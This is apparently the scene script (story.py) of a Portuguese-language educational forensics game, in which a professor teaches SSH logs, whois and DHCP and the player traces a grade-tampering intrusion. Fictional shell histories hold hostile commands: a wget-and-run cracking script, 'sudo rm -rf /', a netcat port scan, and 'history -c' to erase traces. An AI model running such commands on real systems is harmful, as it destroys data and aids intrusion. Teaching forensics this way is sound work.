#
# Arquivo: story.py
#

STORY_STEPS = [
    # --- CENA 1: A ESCOLHA DO PROTOCOLO ---
    { 
        "professor_speech": (
            "Ok, hora de gravar a aula de amanhã.",
            "Primeiro, vamos checar a SSH.",
            "Eu tenho o log habilitado.",
            "Gosto de checar sempre que abro o PC.",
            "Você sabe o que é SSH?",
        ),
        "terminal_text": "", 
        "objective": "Cheque a sua SSH para validar possíveis invasões.", 
        "action_type": "ask_question_branching",
        "question_prompt" : "Voce sabe o que é SSH?",
        "answer_handlers":{
            "sim" : {
                "action" : "proceed_with_speech",
                "professor_speech" : ("Ah, ainda bem que não estou lidando com um leigo.", "Pode entrar, é só digitar ssh prof_larcerinho@192.158.1.1, eu vou mudar depois, nem memoriza em!"),
            },
            "nao" : {
                "action" : "proceed_with_speech",
                "professor_speech" : ("Esses meus alunos estão cada vez mais desatentos",
                                        "SSH significa 'Secure Shell'. É como uma porta dos fundos segura para acessar o computador de qualquer lugar.",
                                        "Eu uso para me conectar no meu servidor aqui da universidade.",
                                        "O mais importante é que eu mantenho o 'log' de autenticação ativado.",
                                        "Esse log é um arquivo de texto que anota *toda* tentativa de conexão, seja ela bem-sucedida ou falha.",
                                        "Se alguém tentar 'bater na porta', o log me diz quem foi, quando tentou e qual 'chave' usou.",
                                        "É uma das melhores ferramentas de segurança para saber se alguém andou bisbilhotando.",
                                        "Enfim, pra entrar é só fazer ssh prof_larcerinho@192.158.1.1, eu vou mudar depois, nem memoriza em!"),
            }
        }
    },

    # --- CENA 2: CONEXÃO SSH ---
    { 
        "professor_speech": (
            "...", 
        ),
        "terminal_text": "", 
        "objective": "Cheque a sua SSH para validar possíveis invasões.", 
        "action_type": "await_command",
        "command_prompt": "user@professor-pc:~$", 
        "expected_command": "ssh prof_larcerinho@192.158.1.1",
    },

    # --- CENA 3: O LOG APARECE ---
    { 
        "professor_speech": (
            "Que ataque que aconteceu aqui?!",
            "Olha esse log... tem muita sujeira, mas o ataque real está aí no meio.",
            "Preciso filtrar o que é rotina do sistema e o que é invasão."
        ),
        "terminal_text": ( 
            "Last login: Fri Nov 10 09:00:01 from 192.168.0.5\n"
            "user@server:~$ cat /var/log/auth.log | tail -n 15\n"
            "Nov 10 09:17:01 server CRON[5401]: (root) CMD (run-parts /etc/cron.hourly)\n"
            "Nov 10 10:00:23 server sshd[8821]: Invalid user admin from 54.22.11.99\n"
            "Nov 10 10:00:23 server sshd[8821]: Connection closed by 54.22.11.99 port 44312 [preauth]\n"
            "Nov 10 10:15:44 server sudo: prof_larcerinho : TTY=pts/0 ; PWD=/home/prof ; USER=root ; COMMAND=/usr/bin/apt update\n"
            "Nov 10 11:42:05 server sshd[9002]: Failed password for root from 189.12.55.10 port 55210 ssh2\n"
            "Nov 10 11:42:08 server sshd[9002]: Failed password for root from 189.12.55.10 port 55210 ssh2\n"
            "Nov 10 11:42:12 server sshd[9002]: Accepted password for root from 189.12.55.10 port 55210 ssh2\n"
            "Nov 10 11:42:12 server sshd[9002]: pam_unix(sshd:session): session opened for user root by (uid=0)\n"
            "Nov 10 11:43:05 server AUDIT: type=PATH msg=audit(1700000:01): name=\"/home/senhas.txt\" mode=0100644\n"
            "Nov 10 11:45:00 server sshd[9002]: Received disconnect from 189.12.55.10 port 55210:11: Disconnected by user"
        ),
        "objective": "Consiga informações sobre o ataque.",
        "action_type": "auto_proceed", 
        "next_step_delay": 1000 
    },

    # --- CENA 4: PERGUNTAS DE FORENSE ---
    { 
        "professor_speech": ("Que IP foi esse que conseguiu entrar?",), 
        "terminal_text": "...", 
        "objective": "Consiga informações sobre o ataque.",
        "action_type": "ask_question",
        "question_prompt": "Qual IP realizou o ataque com SUCESSO?",
        "expected_answer": "189.12.55.10"
    },
    { 
        "professor_speech": ("Certo... e qual usuário ele violou?",),
        "terminal_text": "...",
        "objective": "Descubra o que aconteceu",
        "action_type": "ask_question",
        "question_prompt": "Qual usuário do sistema ele acessou?",
        "expected_answer": "root"
    },
    { 
        "professor_speech": ("E qual arquivo ele acessou? O log de auditoria (AUDIT) deve dizer.",),
        "terminal_text": "...",
        "objective": "Descubra o que aconteceu",
        "action_type": "ask_question",
        "question_prompt": "Qual arquivo ele acessou?",
        "expected_answer": "senhas.txt"
    },

    # --- CENA 5: O ARQUIVO SENHAS.TXT ---
    { 
        "professor_speech": ("É, sabia que... ter esse txt ia me complicar.",
                             "Não é seguro manter todas as suas senhas em um só arquivo.",
                             "Se você realmente tem que guardar em algum lugar... use um gerenciador de senhas!",
                             "Ou só anote na vida real mesmo, em um caderninho. Muito mais seguro.",
                             "Vamos ver o que tem dentro dele"),
        "terminal_text": "...", 
        "objective": "Use 'vim senhas.txt' para ver o arquivo de senhas.",
        "action_type": "await_command",
        "command_prompt": "user@professor-pc:~$", 
        "expected_command": "vim senhas.txt"
    },
    { 
        "professor_speech": ("Ok, são todas as minhas senhas, vou mudar depois, mas preciso descobrir se algo foi acessado","Ok, o que vamos checar primeiro?",),
        "terminal_text": (
            "--- Conteúdo de senhas.txt ---\n"
            "facebook: larcerinhoMadeira@gmail.com | euAmoBolosDeChocolate\n"
            "instagram: larceirinhoMadeira@gmail.com | euGostoDeGatinhos\n"
            "sigaa: 2345meia78@unb.br | euAmoCorrigirProva\n"
            "ifood: larcerinhoMadeira@gmail.com | Guitarra$L4r"
        ),
        "objective": "Investigue os serviços roubados",
        "action_type": "ask_question_branching", 
        "question_prompt": "Qual servico checar primeiro?",
        "answer_handlers": {
            "sigaa": {
                "action": "proceed" 
            },
            "facebook": {
                "action": "show_event", 
                "professor_speech": ("Meu... meu Facebook! Está cheio de Minions!",),
                "terminal_event_display": "assets/images/facebook_minions.png", 
                "sound_effect": "risada_minion.wav"
            },
            "instagram": {
                "action": "show_event", 
                "professor_speech": ("Hmm, parece que nada mudou aqui no Instagram. Normal.",),
                "terminal_event_display": None, 
                "sound_effect": None
            },
            "ifood": {
                "action": "show_event", 
                "professor_speech": ("Enviaram uma pizza pra minha casa!?! Cancela isso!",),
                "terminal_event_display": None,
                "sound_effect": "ding_dong.wav"
            }
        }
    },
    
    # --- CENA 6: O SIGAA ---
    { 
        "professor_speech": ("As notas... Ele mudou as notas de todos!",),
        "terminal_text": (
            "Acessando sigaa.unb.br com '2345meia78@unb.br'...\n"
            "Login... sucesso!\n" 
            "!!! ALERTA: NOTAS ALTERADAS !!!"
        ),
        "objective": "Notas foram alteradas!",
        "action_type": "auto_proceed",
        "next_step_delay": 3000
    },
    {
        "professor_speech": ("Espera, algumas notas são maiores que as originais!", 
                             "Quem quer que tenha feito isso é um deles...", 
                             "Olhe esta imagem. Qual o primeiro aluno com nota maior que o normal?"),
        "terminal_text": "...", 
        "objective": "Consiga informações sobre o ataque.",
        "action_type": "ask_question",
        "question_prompt": "Qual é o primeiro aluno com nota maior que o normal?",
        "expected_answer": "Arthur Luiz",
        "terminal_event_display": "assets/images/notas_completas.png"
    },
    {
        "professor_speech": ("Tem mais outros...",),
        "terminal_text": "...", 
        "objective": "Consiga informações sobre o ataque.",
        "action_type": "ask_question",
        "question_prompt": "Qual é o segundo aluno com nota maior que o normal?",
        "expected_answer": "Luis Felipe",
        "terminal_event_display": "assets/images/notas_completas.png"  
    },
    {
        "professor_speech": ("Tem mais outros...",),
        "terminal_text": "...", 
        "objective": "Consiga informações sobre o ataque.",
        "action_type": "ask_question",
        "question_prompt": "Qual é o terceiro aluno com nota maior que o normal?",
        "expected_answer": "Bruno Henrique",
        "terminal_event_display": "assets/images/notas_completas.png"
    },
    { 
        "professor_speech": ("Vou corrigir isso agora... e mudar todas elas.",),
        "terminal_text": (
            "user@professor-pc:~$ (alterando senhas...)\n"
            "user@professor-pc:~$ (corrigindo notas no SIGAA...)\n"
            "Pronto."
        ),
        "objective": "Notas corrigidas!",
        "action_type": "auto_proceed",
        "next_step_delay": 2000
    },

    # --- CENA 7: INVESTIGAÇÃO TÉCNICA (WHOIS -> DHCP) ---
    { 
        "professor_speech": (
            "O sistema está seguro, mas o criminoso ainda está solto.",
            "Temos os nomes dos alunos suspeitos (Arthur, Luis, Bruno), mas precisamos de uma prova técnica.",
            "Lembra daquele IP que atacou a gente? 189.12.55.10.",
            "Vamos usar o comando 'whois' nele. Esse comando consulta bancos de dados públicos para dizer quem é o 'dono' de um IP."
        ),
        "terminal_text": "...",
        "objective": "Descubra o dono do IP: 'whois 189.12.55.10'",
        "action_type": "await_command",
        "command_prompt": "user@professor-pc:~$",
        "expected_command": "whois 189.12.55.10"
    },
    
    { 
        "professor_speech": (
            "Hmm... veja o resultado.",
            "O dono do IP é 'UNB-DORM-WIFI-NET'. Ou seja, é a rede Wi-Fi dos dormitórios da própria UnB.",
            "O 'whois' é ótimo para descobrir se um ataque veio da China ou da Rússia, mas para redes locais ele só aponta para a organização.",
            "Não temos o nome da pessoa aqui, apenas sabemos que ela está usando o Wi-Fi da universidade."
        ),
        "terminal_text": (
            "user@professor-pc:~$ whois 189.12.55.10\n"
            "% This is the RIPE Database query service.\n"
            "inetnum:      189.12.55.0 - 189.12.55.255\n"
            "netname:      UNB-DORM-WIFI-NET\n"
            "descr:        University of Brasilia Student Housing\n"
            "country:      BR\n"
            "admin-c:      ADM-UNB\n"
            "status:       ASSIGNED PA\n"
        ),
        "objective": "Whois inconclusivo. Analise a situação.",
        "action_type": "auto_proceed",
        "next_step_delay": 5000 
    },

    # --- NOVO: EXPLICAÇÃO DO DHCP ---
    {
        "professor_speech": (
            "Ainda bem que temos logs internos.",
            "Vamos ter que checar o DHCP.",
            "Você sabe o que é DHCP?"
        ),
        "terminal_text": "...",
        "objective": "Entenda o conceito de DHCP.",
        "action_type": "ask_question_branching",
        "question_prompt": "Voce sabe o que é DHCP?",
        "answer_handlers": {
            "sim": {
                "action": "proceed_with_speech",
                "professor_speech": (
                    "Perfeito. Então você sabe que ele distribui os IPs na rede.",
                    "E o melhor: ele mantém um registro de quem pegou qual IP."
                ),
            },
            "nao": {
                "action": "proceed_with_speech",
                "professor_speech": (
                    "DHCP significa 'Dynamic Host Configuration Protocol'.",
                    "Pense nele como o recepcionista da rede.",
                    "Quando um dispositivo se conecta, o DHCP 'empresta' um IP para ele por um tempo.",
                    "E como todo bom recepcionista, ele anota tudo.",
                    "Podemos ver qual dispositivo (MAC Address ou Nome) estava usando aquele IP específico na hora do ataque."
                ),
            }
        }
    },
    # -------------------------------

    { 
        "professor_speech": (
            "Certo, acesso aos logs de rede liberado.",
            "Descubra qual dispositivo estava usando o IP 189.12.55.10.",
            "Use 'cat /var/log/dhcp_leases'."
        ),
        "terminal_text": "...",
        "objective": "Verifique o DHCP: 'cat /var/log/dhcp_leases'",
        "action_type": "await_command",
        "command_prompt": "user@professor-pc:~$",
        "expected_command": "cat /var/log/dhcp_leases"
    },

    # --- CENA 8: A DÚVIDA ÉTICA (IP FALSO) ---
    { 
        "professor_speech": (
            "O log DHCP diz que o IP 189.12.55.10 pertence ao dispositivo 'Luis-Gamer-PC'.",
            "Isso parece incriminador.",
            "Mas eu te pergunto: Baseado APENAS no IP, podemos expulsar o Luis da universidade agora mesmo?"
        ),
        "terminal_text": (
            "user@professor-pc:~$ cat /var/log/dhcp_leases\n"
            "TIME              MAC ADDRESS        IP ADDRESS      HOSTNAME\n"
            "11:40:01          a1:b2:c3:d4:e5     189.12.55.05    Iphone-de-Arthur\n"
            "11:41:22          11:22:33:44:55     189.12.55.12    Bruno-Notebook\n"
            "11:42:05          aa:bb:cc:dd:ee     189.12.55.10    Luis-Gamer-PC\n" 
            "11:45:10          ff:ee:dd:cc:bb     189.12.55.15    Maria-Notebook\n"
        ),
        "objective": "Decida se a prova é suficiente.",
        "action_type": "ask_question_branching",
        "question_prompt": "O IP é prova suficiente para condenar? (sim/nao)",
        
        "answer_handlers": {
            "sim": {
                "action": "show_event", 
                "professor_speech": "Errado! IPs podem ser falsificados (Spoofing) ou o PC dele pode ter sido invadido remotamente. Precisamos de mais provas.",
                "take_damage": True
            },
            "nao": {
                "action": "proceed_with_speech",
                "professor_speech": (
                    "Exato. IPs são circunstanciais. O Luis pode ser uma vítima de 'Spoofing' ou acesso remoto.",
                    "Precisamos de uma prova comportamental. Saber o que foi digitado naquela máquina."
                )
            }
        }
    },

    # --- CENA 9: A INVESTIGAÇÃO FINAL (LOGS COMPLEXOS E SUTIS) ---
    { 
        "professor_speech": (
            "No Linux, o arquivo oculto '.bash_history' dentro da pasta de cada usuário guarda os comandos digitados.",
            "O caminho é '/home/[nome_do_usuario]/.bash_history'.",
            "Eu vou liberar o terminal para você.",
            "Use o comando 'cat' para ler o histórico de cada suspeito (arthur, luis, bruno).",
            "Não vou dar dicas. Analise os comandos e ache o hacker.",
            "Quando tiver certeza, digite 'pronto'."
        ),
        "terminal_text": "...",
        "objective": "Investigue os usuários: arthur, luis, bruno",
        "action_type": "ask_question_branching",
        "question_prompt": "Qual usuário investigar? (ou 'pronto')",
        
        "answer_handlers": {
            # 1. INVESTIGAR ARTHUR (Inocente - Programador)
            "arthur": {
                "action": "show_event",
                "professor_speech": "Ok, lendo histórico do Arthur... tire suas conclusões.",
                "terminal_text_append": ( 
                    "\nuser@professor-pc:~$ cat /home/arthur/.bash_history\n"
                    "sudo netstat -tulpn\n"
                    "ssh-keygen -t rsa\n"
                    "cat /home/arthur/.ssh/id_rsa.pub\n"
                    "git clone https://github.com/arthur/password-manager.git\n"
                    "vim password_manager.py\n"
                    "python3 password_manager.py\n"
                    "sudo service apache2 restart\n"
                    "exit"
                )
            },
            
            # 2. INVESTIGAR LUIS (Inocente - Script Kiddie)
            "luis": {
                "action": "show_event",
                "professor_speech": "Ok, lendo histórico do Luis... tire suas conclusões.",
                "terminal_text_append": (
                    "\nuser@professor-pc:~$ cat /home/luis/.bash_history\n"
                    "steam\n"
                    "ping 192.158.1.1\n"
                    "wget http://hacker-tools.com/crack-sigaa-v2.sh\n"
                    "chmod +x crack-sigaa-v2.sh\n"
                    "./crack-sigaa-v2.sh\n"
                    "sudo rm -rf /\n"
                    "exit"
                )
            },
            
            # 3. INVESTIGAR BRUNO (Culpado - Hacker Profissional Sutil)
            "bruno": {
                "action": "show_event",
                "professor_speech": "Ok, lendo histórico do Bruno... tire suas conclusões.",
                "terminal_text_append": (
                    "\nuser@professor-pc:~$ cat /home/bruno/.bash_history\n"
                    "ping -c 3 192.158.1.1\n"
                    "nc -zv 192.158.1.1 22\n"
                    "ssh root@192.158.1.1\n"
                    "scp notas_alteradas.csv root@192.158.1.1:/var/www/sigaa/data/\n"
                    "rm notas_alteradas.csv\n"
                    "history -c"
                )
            },
            
            # 4. SAIR DO LOOP
            "pronto": {
                "action": "proceed_with_speech",
                "professor_speech": "Certo. Você analisou as evidências.",
                "next_step_delay": 1000
            }
        }
    },

    { # Passo 14: A Acusação Final
        "professor_speech": "Baseado nos comandos que você viu no histórico... quem invadiu meu sistema?",
        "terminal_text": "...",
        "objective": "ACUSE O VERDADEIRO CULPADO.",
        "action_type": "ask_question_branching",
        "question_prompt": "Digite o nome do culpado:",
        
        "answer_handlers": {
            # ACERTO
            "bruno": {
                "action": "proceed_with_speech",
                "professor_speech": (
                    "Na mosca. Ele foi extremamente sutil.",
                    "Usou 'nc' para escanear a porta SSH em vez de ferramentas barulhentas.",
                    "O Netcat (nc) é um utilitário que lê e escreve dados em conexões de rede, perfeito para reconhecimento furtivo.",
                    "Usou 'scp' para transferir o arquivo malicioso sem deixar muitos rastros.",
                    "O SCP copia arquivos entre máquinas de forma criptografada usando o protocolo SSH, garantindo discrição.",
                    "E o 'history -c' no final foi a tentativa desesperada de limpar a cena do crime.",
                    "Bom trabalho, detetive. Caso encerrado."
                ),
                "next_step_delay": 4000
            },
            
            "bruno henrique": {
                "action": "proceed_with_speech",
                "professor_speech": (
                    "Na mosca. Ele foi extremamente sutil.",
                    "Usou 'nc' para escanear a porta SSH em vez de ferramentas barulhentas.",
                    "O Netcat (nc) é um utilitário que lê e escreve dados em conexões de rede, perfeito para reconhecimento furtivo.",
                    "Usou 'scp' para transferir o arquivo malicioso sem deixar muitos rastros.",
                    "O SCP copia arquivos entre máquinas de forma criptografada usando o protocolo SSH, garantindo discrição.",
                    "E o 'history -c' no final foi a tentativa desesperada de limpar a cena do crime.",
                    "Bom trabalho, detetive. Caso encerrado."
                ),
                "next_step_delay": 4000
            },
            
            
            # ERRO 1 (arthur)
            "arthur": {
                "action": "game_over_speech",
                "professor_speech": (
                    "O Arthur?! Não!",
                    "Ele estava apenas programando em Python e rodando Docker. Coisas normais de dev.",
                    "Acusamos a pessoa errada...",
                    "O invasor percebeu que estamos investigando o alvo errado.",
                    "Ele ativou o Kill Switch. Adeus sistema..."
                )
            },
            "arthur luiz": {
                "action": "game_over_speech",
                "professor_speech": (
                    "O Arthur?! Não!",
                    "Ele estava apenas programando em Python e rodando Docker. Coisas normais de dev.",
                    "Acusamos a pessoa errada...",
                    "O invasor percebeu que estamos investigando o alvo errado.",
                    "Ele ativou o Kill Switch. Adeus sistema..."
                )
            },
            
            # ERRO 2 (luis)
            "luis": {
                "action": "game_over_speech",
                "professor_speech": (
                    "O Luis?! Olha o histórico dele...",
                    "Ele baixou um script falso da internet e nem conseguiu rodar.",
                    "O IP dele foi clonado pelo invasor via Spoofing.",
                    "Enquanto perdíamos tempo com ele, o ataque real aconteceu.",
                    "Tarde demais. Os arquivos estão sendo criptografados..."
                )
            },
            "luis felipe": {
                "action": "game_over_speech",
                "professor_speech": (
                    "O Luis?! Olha o histórico dele...",
                    "Ele baixou um script falso da internet e nem conseguiu rodar.",
                    "O IP dele foi clonado pelo invasor via Spoofing.",
                    "Enquanto perdíamos tempo com ele, o ataque real aconteceu.",
                    "Tarde demais. Os arquivos estão sendo criptografados..."
                )
            },

            "larcelo madeira": {
                "action": "game_over_speech",
                "professor_speech": (
                    "Tá me acusando!?",
                    "Não temos tempo para essas brincadeiras... kh-",
                    "Droga, o invasor percebeu!",
                    "Tarde demais. Os arquivos estão sendo criptografados..."
                )
            },
            "larcelo": {
                "action": "game_over_speech",
                "professor_speech": (
                    "Tá me acusando!?",
                    "Não temos tempo para essas brincadeiras... kh-",
                    "Droga, o invasor percebeu!",
                    "Tarde demais. Os arquivos estão sendo criptografados..."
                )
            }
        }
    },
    
    { # Passo 15: Fim
        "professor_speech": "Vou levar isso para a reitoria. Você salvou o semestre.",
        "terminal_text": "...",
        "objective": "VITORIA",
        "action_type": "auto_proceed",
        "next_step_delay": 5000
    }
]